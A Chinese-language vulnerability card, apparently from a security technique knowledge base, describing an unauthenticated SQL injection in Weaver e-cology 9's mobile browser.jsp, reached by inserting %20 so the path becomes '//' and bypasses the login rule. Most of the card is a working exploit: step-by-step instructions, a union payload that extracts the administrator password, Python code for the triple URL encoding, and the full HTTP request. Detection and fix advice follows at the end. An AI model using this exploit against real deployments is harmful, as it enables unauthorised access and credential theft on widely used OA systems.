---
id: web-generic-sqli-weaver-e9-browser-jsp-double-slash-sqli
title: 泛微 e9 browser.jsp 未授权 union 注入：%20 制造双斜杠绕过移动端安全规则
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-e9-browser-jsp-double-slash-sqli
aliases:
- 泛微 e9 browser.jsp 注入
- 泛微 mobile browser.jsp
- 泛微 %20 绕过
- 泛微双斜杠绕过
- 泛微 browserTypeId=269
- 泛微 SplitPageUtil 注入
tags:
- sqli
- java
- weaver
- ecology
- oa
- union-injection
- path-bypass
- resin
- unauth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:29:23+08:00'
  notes: 已对照原文核对：browser.jsp 参数流、BrowserAction#getBrowserData、getLimitPageData/SplitPageUtil#getCurrentPageRs 回显点、%20 被 Resin getServletPath 丢弃形成 //、SecurityRuleMobile29 不匹配 mobile-need-login-urls、三次 URL 编码与 union payload 均与卡片一致；affected_versions 原为分析环境版本，已清除。未实际复现。
---

## 一句话结论

泛微 e9 移动端 `/mobile/plugin/browser.jsp` 把 `keyword` 拼进 `meeting_remind_type` 的 LIKE 查询并最终在 `SplitPageUtil#getCurrentPageRs` 执行；在路径中插入 `%20` 后，Resin 的 `getServletPath()` 会丢掉空格得到 `/mobile//plugin/browser.jsp`，不匹配 `mobile-need-login-urls` 安全规则，从而未授权访问并用 `union select` 读出管理员密码。

## 原理

- **入口**：`browser.jsp` 读取 `isDir`、`keyword`、`browserTypeId`，要求 `isDir=1`，否则请求转发到 `/mobile/plugin/dialog.jsp`；参数传给 `weaver.mobile.webservices.common.BrowserAction#getBrowserData`。
- **分支**：`browserTypeId=269` 进入返回数据最完整的分支；`keyword` 参与 `meeting_remind_type` 的 `name LIKE '%<keyword>%'` 查询。
- **Sink**：分支中先调 `executeSql` 执行一次，但该处只能做时间盲注、不直接回显；真正的回显点在后续 `getLimitPageData`，最终由 `weaver.general.SplitPageUtil#getCurrentPageRs(int, int)` 执行并取结果。注入 `union select` 后，密码作为查询结果直接出现在页面数据中。
- **%20 绕过**：Resin 对 `getRequestURI()` 保留 `%20`，但 `getServletPath()` 返回时已去掉 `%20`，实际进入安全规则的是 `/mobile//plugin/browser.jsp`。安全规则 `SecurityRuleMobile29` 依据 `mobile-need-login-urls` 判断，`//` 不在列表中，规则不命中而直接放行；其他规则也没有拦截 `//`。
- **三次解码**：容器解码一次，JSP 解码一次，Java 方法内再解码一次；因此提交的 `keyword` 需要做三次 URL 编码，才能在最终拼 SQL 时还原为 `%' union select ...`。
- **为什么不加 `%20` 不行**：正常路径 `/mobile/plugin/browser.jsp` 会被 `SecurityRuleMobile29` 拦截，返回 `errorMsg: securityIntercept`。

## 触发条件

- 目标为泛微 e-cology 9（原文环境 9.00.210804 v10.42），存在 `/mobile/plugin/browser.jsp`。
- 目标使用 Resin 中间件，且 `getServletPath()` 会丢弃 `%20`。
- `browserTypeId=269` 分支可达，且 `meeting_remind_type` 表存在。
- 数据库为 MySQL，支持 `union select` 与子查询。
- 安全规则中没有针对 `//` 或 `%20` 的额外拦截。

## 利用步骤

1. 构造注入载荷：`axa%' union select 1,(select password from HrmResourceManager where id=1))my_table)r#`。
2. 对该载荷做三次 URL 编码（容器、JSP、Java 方法各解码一次）。
3. 请求 `/mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=<三次编码后的载荷>`。
4. 页面数据中出现 `HrmResourceManager.id=1` 的密码；若被拦截，确认响应头是否为 `errorMsg: securityIntercept`。
5. 若不使用 `%20`，同一请求会被移动端安全规则拦截，作为对照。

## PoC

原始注入载荷：

```text
axa%' union select 1,(select password from HrmResourceManager where id=1))my_table)r#
```

三次 URL 编码（Python 示例，实际提交 `enc3`）：

```python
from urllib.parse import quote
p = "axa%' union select 1,(select password from HrmResourceManager where id=1))my_table)r#"
enc3 = quote(quote(quote(p, safe=""), safe=""), safe="")
print(enc3)
```

请求：

```http
GET /mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=<enc3> HTTP/1.1
Host: target:8060
Accept: */*
Content-Type: charset=UTF-8
```

最终执行的 SQL（节选）：

```sql
select r.* from (
  select my_table.* from (
    select distinct t1.id as id, t1.name as name
    from meeting_remind_type t1
    where isuse=1 and t1.name like '%axa%'
    union select 1,(select password from HrmResourceManager where id=1)
  )my_table
)r# '%' order by t1.id desc) my_table limit 0,10) r
```

`#` 注释掉后续的 `'%' order by ...`，`union select` 的第二列即密码，随页面数据返回。

## 变体与关联

- 更换子查询：把 `select password from HrmResourceManager where id=1` 换成任意表/字段；`browserTypeId` 换其他分支可能同样可达注入点，但回显完整度不同。
- 路径变体：`/mobile//plugin/browser.jsp`、`/mobile/%20/plugin/browser.jsp` 等，取决于 Resin/容器对空格的规范化；核心是让安全规则看到的路径与业务路由解析出的路径不一致。
- 关联：[[web-generic-sqli-weaver-e9-filedownloadlocation-union-file-read]]（同产品 union 注入，但利用 `/weaver/*` 路由与 `/login` 绕过）。
- 关联：[[web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind]]（同产品 `/api/*` 路由的布尔盲注）。

## 检测与防御

- **日志检测**：`/mobile/` 路径中出现 `%20`、`//` 或非常规空白；`keyword` 含三次编码痕迹、`union`、`select`、`HrmResourceManager`；同一接口 `browserTypeId=269` 且响应包含异常字段值。
- **WAF**：对路径先做一次统一 URL 解码与规范化，再匹配安全规则；对 `keyword` 解码到最终值后检查 SQL 关键字；拦截 `/mobile//` 等双斜杠路径。
- **修复**：`keyword` 使用预编译参数，禁止拼接 `LIKE`；`SplitPageUtil` 对传入 SQL 做参数化改造；安全规则对路径做规范化后再比对 `mobile-need-login-urls`，不要依赖容器对 `%20` 的差异。
- **加固**：升级到修复版本；对 `/mobile/*` 增加统一登录校验；数据库账号最小权限；限制 `browserTypeId` 可选值。
